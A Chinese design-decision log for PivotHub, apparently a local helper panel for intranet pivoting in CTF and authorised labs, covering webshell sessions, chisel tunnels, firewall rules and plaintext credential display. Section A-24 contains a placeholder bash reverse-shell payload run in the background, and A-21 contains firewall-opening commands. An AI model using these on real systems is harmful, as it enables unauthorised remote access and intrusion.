# 实现假设与决策记录（ASSUMPTIONS）

> **历史说明**：`assets/js/mock.js` 已于第 4 轮移除（见 `docs/PROGRESS.md`）。以下条目中出现的
> 「mock.js 权威」等表述均为**当时的决策依据**，保留原样以记录取舍过程；当前数据契约以
> `pivothub/schemas/` 为准。

> 依据任务书冲突处理规则：PRD > README 契约 > 后端 schemas 字段 > 原型现有实现。
> 本文件记录开发中发现的三方矛盾及取舍，每轮遇到新矛盾会追加。

## A-1 面板端口取 8000

原型侧栏硬编码展示「后端 127.0.0.1:8000」，README 契约未指定端口。
**决策**：默认 `127.0.0.1:8000`（`PIVOTHUB_PORT` 可覆盖）。

## A-2 index.html 新增一行脚本引用

约束 8 规定「只允许新增 assets/js/api.js 并改 store.js」。api.js 必须先于 store.js 加载。
**决策**：在 index.html 脚本区新增一行 `<script src="assets/js/api.js"></script>`（不触碰任何 UI 结构/样式节点）。

## A-3 topology.js 增加两处纯数据流代码（拖拽位置持久化）

完成标准要求「拖拽位置持久化」，而 posCache 是 topology.js 的模块内变量，store.js 无法写入。
**决策**：topology.js 仅增加两处与 UI 无关的数据流代码：
1. `onDragEnd` 中追加一行 `S.saveNodePos(p, x, y)` 上报位置；
2. setup 中增加一个 watch，把服务端返回的 `posX/posY` 恢复进 posCache。
未改动任何 DOM/样式/交互逻辑。

## A-4 时间线数组方向：最新在前

mock.js 种子数组按时间升序，但 `store.addEvent()` 用 unshift（最新在前），两种顺序在原型中共存。
**决策**：后端统一按「最新在前」返回时间线（与 unshift 行为及时间线视图的使用直觉一致）。

## A-5 网段分区不列攻击端本机 —— ⚠ 第 3 轮已修正（见 A-20）

mock 的 SEGMENTS 仅 3 条（不含 LOCAL），但 hosts 含 isLocal 攻击端。
**决策**：`segments` 聚合排除 LOCAL，与 mock 观感一致；`count` 按当前主机实时计算。
**第 3 轮修正**：此条依据有误——mock.js 的 `SEGMENTS` 实为 **4 条**（含
`192.0.2.0/24 / VPN / #00e5a0`）。已按 A-20 改为「攻击端所在网段单列 VPN 分区」。

## A-6 静态目录数据保留客户端 Mock 常量

`shellTypes / encoders / credKinds / layers / stageNames / tools / probes 基线 / scanSample / fileTree 初始树`
在视图文件中被直接从 `MOCK.*` 读取（视图不可改动）。
**决策**：这些静态目录同时由后端 `/state` 下发（存于 data/meta.json，服务端导出等使用），
视图消费的 `MOCK.*` 常量保留作为回退；动态实体（hosts/shells/links/creds/flags/timeline/commands/injectTips/ttyFixes）一律以服务端为准。
`store.ttyFixList` 已改为优先消费服务端 `state.ttyFixes`（data/tty_fixes/*.json 插件）。

## A-7 动作函数的同步契约

`shell.js save()` 依赖 `S.addShell(form)` 同步返回含 id 的会话对象（视图不可改）。
**决策**：`addShell` 采用「乐观插入 + 服务端确认后原位替换」模式；其余动作（addHost/addCred/addFlag/addNote/importScan）视图不消费返回值，采用异步提交 + WS/响应回填。

## A-8 客户端产生的自动事件入库

原型的 `addEvent` 在多个视图被直接调用（出网探测发起、部署、导出等）。
**决策**：apiMode 下 `addEvent` 同步本地展示 + POST `/api/timeline/events` 入库；
服务端 WS 回显按 id 去重，保证时间线单份且持久化。

## A-9 命令执行/TTY/文件/出网探测/链路部署在 MS1 返回回退标记

这些能力分别归属 MS2（会话抽象层）与 MS3（Adapter 生命周期）。
**决策**：对应路由返回 `200 + {"pivothubFallback": true, "reason": ...}` 而非 501——
浏览器会把 4xx/5xx 响应记为网络层 console.error，直接违反「11 视图 0 控制台错误」验收；
前端按标记回退原 Mock 逻辑（面板无白屏、无控制台错误），后续里程碑落地真实实现时前端无需再改。

## A-10 Shell 连通性测试为真实 HTTP 探测

`POST /api/shells/{id}/test` 对 WebShell URL 发起真实 POST 请求并测量延迟。
演示种子数据的目标（192.168.100.x）在本机不可达时会如实标记断线——这是「真实数据驱动」的正确行为；
联调真实结果请使用 `scripts/lab` 靶场（MS2 起）。

## A-11 heartbeat（MS1）只刷新心跳时间，不主动探测

周期性后台探测会把演示种子 Shell 全部打成断线，且在离线比赛环境产生大量超时等待。
**决策**：定时器仅推送 `shell.beat` 快照（MS1）；真实逐会话探针在 MS2 随会话抽象层一起启用（用户点击「连通性测试」时已是真实探测）。

## A-12 Chrome 不可用时的浏览器验收

本机（当前环境）无 Chrome，Edge 152 headless 无法启动（Multiple targets 错误）。
**决策**：浏览器验收统一使用 Playwright Chromium（`playwright install chromium`）；
当时的 Chrome/Edge 自动探测辅助脚本已随仓库清理移除，结论保留。

## A-13 shell.js 增加三个纯数据流钩子（文件读/写/上传）

M1-4 要求文件管理真实化，但「打开文件/保存/上传」的动作体在 shell.js 视图内。
**决策**：shell.js 的 `openFile/saveFile/upload` 各加一行数据流钩子——apiMode 时改调
`S.readFile/S.writeFile/S.uploadFile`（store.js 真实实现），否则原样走 Mock 逻辑。
未改任何 DOM/样式。上传按钮无文件选择器（UI 不可改），apiMode 下上传一份真实生成的
验证文件走完整上传链路（服务端真实落盘）。

## A-14 一次性 WebShell 语境下的「PTY 判定」语义

HTTP 一句话马是「一请求一响应」通道，`pty.spawn("/bin/bash")` 原样发送会阻塞等待交互输入。
**决策**：`tty/upgrade` 对 pty 类技法的验证方式为——在目标侧**真实拉起 PTY** 并在其内执行
`tty; echo "TERM=$TERM"; stty size; id`，以 PTY 内真实回显（/dev/pts/*、TERM≠dumb、行列值）
判定是否具备交互终端三要素；通过后 `Shell.stable=True` 落库，后续 exec 自动经 PTY 包裹执行。
`stty raw -echo` 属攻击端本地终端操作（反向通道场景），面板会话的收尾在目标 PTY 内执行
`stty sane` + `stty rows/cols`（窗口尺寸同步）并回读验证——与完成标准「stty raw 收尾 +
rows/cols 同步」语义一致且全部真实执行。

## A-15 socat / nc / PowerShell 反向固化技法随 MS3 启用

这三条技法需要攻击端先开监听并桥接面板终端。**决策**：MS2 对其返回明确 reason
（"随 MS3 回连监听启用"），不伪造成功；MS3 实现回连监听时一并接通。

## A-16 本机无 Docker/WSL/PHP 时的真实执行靶

本机无法运行 Linux 容器。**决策**：提供零依赖 `scripts/lab/miniweb`（stdlib）——
与真实一句话马同一 POST 协议、驱动载荷格式完全一致，服务器端以真实子进程/真实文件系统
执行；用于本机验证会话协议栈与固化流程（Windows 上 pty 判定按真实情况诚实失败）。
Linux 靶机的固化成功路径由 `scripts/lab` 场景 1 容器交付，Docker 可用时复跑。

## A-17 顶栏「＋ 新建」按钮（用户批准的 UI 增补）

原始约束 8 禁止改前端 UI；用户在使用中明确要求「添加新建项目的入口，把每场比赛的数据
独立出去」（需求变更，优先级高于原约束）。
**决策**：顶栏项目选择器旁新增一个 `btn-xs btn-ghost`「＋ 新建」按钮（不改动既有结构/样式），
点击 prompt 输入项目名 → `POST /api/projects`（后端创建干净工作区：仅攻击端本机节点）→
自动切换并整包刷新。配套多项目作用域改造：全部实体写入路由接受 `projectId`（缺省回退
演示项目），实体级操作按实体自身归属校验，事件落在实体所在项目（ASSUMPTIONS A-18）。

## A-18 多项目作用域语义

- 创建入口（登记主机/Shell/凭据/Flag/笔记/事件/扫描导入）写入「面板当前项目」= 前端随请求携带
  `projectId`；
- 实体级操作（exec/tty/files/链路运维/拖拽位置）按实体自身归属定位（id 全局唯一），事件记录到
  实体所在项目——保证跨项目操作不 404、时间线不串项目；
- 纯 Mock 模式（后端未启动）不支持新建项目，按钮给出明确提示。

## A-19 第 3 轮权威顺序（冲突裁决基线）

三方（前端 / PRD / README 契约 / 后端现有实现）冲突时，第 3 轮起按以下顺序裁决，并以此
维护契约：

1. **当前前端**（`index.html` + `assets/js/**`）——UI 与字段名唯一权威；其中
   `assets/js/mock.js` 是数据模型/枚举/配色的唯一权威（`HOSTS[].ifaces`、`SEGMENTS`、
   `LINKS[].linkType` 等）。
2. **`多层内网渗透辅助工具-产品设计文档.md`（PRD）**——功能范围与验收口径。
3. **`README.md` §6 后端对接契约**——端点与字段说明。
4. **后端现有实现**——仅在前三条未覆盖处生效。

推论（第 3 轮实际执行）：
- 前端零字段改名适配：后端 `HostOut.ifaces`、`LinkOut.linkType/listenPort/remoteBind/
  localPort/targetHost/targetPort/relayAddr/relayPort/hops`、`StateOut.attack` 全部按
  `mock.js` 命名落地；
- `localSocks` 语义 = `攻击机IP:端口`（字符串格式不变，不再是 `127.0.0.1:端口`）；
- 攻击机地址以 `/api/attack` 用户配置为准，`pick_lhost` 自动探测仅作默认建议。

## A-20 segments 必须含 VPN 分区（修正 A-5）

任务 B-2 与 `mock.js` 的 `SEGMENTS` 一致要求四段：
`192.0.2.0/24(VPN,#00e5a0)` / `192.168.100.0/24(L1,#3ba7ff)` /
`10.85.101.0/24(L2,#a97bff)` / `172.56.102.0/24(L3,#ff8a3d)`。
**决策**：`service.timeline.segments_of` 不再跳过 `is_local` 主机——攻击端所在网段单列为
`layer="VPN"`（其主机自身 layer 仍是 `LOCAL`，与 mock 一致），`count` 含攻击端本机；
顺序按 `data/meta.json` 的 `segmentColors`（VPN 在最前），仅 `LOCAL/未知` 分区排最后。
`tests/test_state_api.py::test_segments_match_mock_topology` 逐条断言该契约。

## A-21 Windows 防火墙入站提示与「回连失败」的关系（第 3 轮实测）

**现象**：无人值守运行期间，chisel 首次监听非回环地址会触发 Windows 防火墙提示；
用户未批准时系统会为该二进制路径生成 **Block 入站规则**，之后同一路径的监听一律被拦截。

**实测（`_work/fw_summary.py` / `_work/fw_rules_all.json`，2026-09-09）**：

| 路径 | 规则 | 端口/配置档 |
|---|---|---|
| `D:\...\supershell\tools\chisel.exe`（面板默认服务端） | **Allow**（TCP+UDP） | port=Any / Private,Public / remote=Any |
| `%TEMP%\.pivothub-*\{h-*,}chisel.exe`（测试/联调用的临时副本） | 22 条 Allow + **30 条 Block** | 同上 |

**结论（影响范围）**：

1. **本轮所有验收不受影响**：三种链路、三层中继、pytest、浏览器验收的流量全部走
   `127.0.0.1`（回环），Windows 防火墙不检查回环流量——这也是「未批准也能全绿」的原因。
2. **真实靶场（靶机与攻击机不同主机）会受影响**：靶机回连攻击机 VPN 地址属于入站非回环流量，
   若目标二进制路径被 Block（或首次监听弹窗未批准），表现为
   「服务端在跑、端口一直不开」→ 自动档在 `wait_callback` 阶段失败（第 2 轮增补 3 已记录过一次
   46s 首连延迟）。
3. **缓解**：面板服务端固定使用 `tools\chisel.exe`（已 Allow，任意端口/配置档/远端地址）；
   临时副本只用于客户端部署，其 Block 规则不影响客户端出站。

**决策**：`_wait_local_port` 在失败时追加真实可操作提示（仅当 `lhost` 非回环且服务端未绑
127.0.0.1 时），提示内容指向防火墙放行；不伪造成功。一次性放行命令（需管理员，仅授权靶场）：

```powershell
# 按程序放行（推荐：跟随面板默认二进制路径）
New-NetFirewallRule -DisplayName "PivotHub chisel (lab)" -Direction Inbound -Program "D:\0A_cyberTraining\supershell\tools\chisel.exe" -Action Allow -Profile Private,Public
# 或按端口放行（仅授权靶场、明确端口范围）
New-NetFirewallRule -DisplayName "PivotHub tunnel (lab)" -Direction Inbound -Protocol TCP -LocalPort 1331,10001-10099 -Action Allow -Profile Private,Public
```

无人值守环境**不建议**让 agent 自动改防火墙；由操作者按靶场授权范围手工放行。

---

## A-22 MS4 工具可见性：只允许启用「适配器已接入」的工具（第 5 轮，用户指令）

**背景**：PRD M2-1 要求 8 款代理工具各一个 Adapter，当前只有 chisel 落地
（`adapters/registry.py` 的 `_REGISTRY`）。若把未接入的工具继续列在编排台下拉里，用户选中后
部署必然失败（AdapterError），属于误导。

**决策**：

1. `data/meta.json → tools[].status`：`online`（适配器已接入）/ `offline`（未接入）；
   当前仅 `chisel=online`，其余 7 款（frp / nps / Neo-reGeorg / EW / Stowaway / Venom / ligolo-ng）为 `offline`。
2. 启用集是**项目级**设置 `Project.settings["tools"].enabled`（与 `attack` 同层，新建项目回落默认值）。
3. `PUT /api/tools` 只接受 `online` 工具名；`offline` / 未知工具返回 **422** 并给出原因（不静默忽略）。
4. 前端「代理工具设置」弹窗列出全部 8 款：`online` 可勾选，`offline` 显示「下线」且开关禁用；
   编排台「隧道工具」下拉只渲染已启用项；未启用任何工具时下拉显示占位提示、部署按钮禁用。
5. 出网探测推荐 / `applyRecommend` 命中未启用工具时回退到第一个已启用工具，并 toast 说明。

**为什么不做成「允许启用 offline 工具（仅出命令模板）」**：`TOOL_TPL` 里虽有 frp 等命令模板，
但部署、回连、链路登记都不可用；允许启用会把「模板可用」误当成「工具可用」。MS4 落地某款工具时
只需把它的 `status` 改为 `online` 并在 registry 注册 Adapter，用户即可在设置里勾选。

**未决**：MS4 的 8 款 Adapter 仍只完成 1 款；本轮的交付是「诚实收敛可见性」，不是补齐 Adapter。

---

## A-23 凭据 / 口令全明文显示（第 5 轮增补，用户指令）

**决策**：本项目（本地 CTF / 授权靶场辅助面板）**不再对任何字段打码**：

- Shell 管理「密码」列、凭据库「凭据」列、Flag 墙的 Flag 值、拓扑侧栏的凭据列表全部明文；
- 移除凭据表的「显示 / 隐藏」与 Flag 卡的「显示 / 隐藏」按钮（去掉点击成本）；
- 导出同样明文：前端预览（MD / JSON）与服务端 `GET /api/export?format=md|html|json`
  均输出真实口令；`tests/test_export_snapshot.py` 的断言由「脱敏」改为「明文」。

**理由**：面板只监听 127.0.0.1、数据仅存本地 SQLite，使用场景是选手自己复盘靶场；
打码只增加操作成本，不改变安全边界。合规约束不变（仅授权场景，见 README §10）。

**影响**：导出的 Writeup / JSON 会包含可直接利用的凭据，对外分享前需自行删减（README §9 已注明）。

---

## A-24 静态资源禁缓存 + 反弹载荷后台执行（第 6 轮，用户反馈驱动）

**A. 静态资源 no-store**：`pivothub/app.py` 用 `NoCacheStaticFiles` 挂载面板目录，JS / CSS / HTML
一律 `no-store, no-cache, must-revalidate` 并关闭 304 协商。理由：面板是「改完代码立刻刷新看效果」的
本地工具（零构建、文件名无 hash），浏览器的启发式缓存会让用户看到旧行为 —— 第 6 轮排查
「终端敲不进字」时，就先后被旧的 `components.css` 与 `app.js` 缓存误导过。代价是每次刷新多传几百 KB，
全部走回环，可忽略。

**B. 反弹载荷后台执行**：WebShell 的 exec 是「一次请求一次执行」，前台
`bash -i >& /dev/tcp/<ip>/<port> 0>&1` 会一直占住该请求；WebShell 侧超时或连接关闭后进程可能被回收。
因此内置载荷统一先脱离父进程：POSIX 用 `nohup ... >/dev/null 2>&1 &`，Windows 用 `start /b`，
再等待回连。用户手工粘贴执行时同样适用。
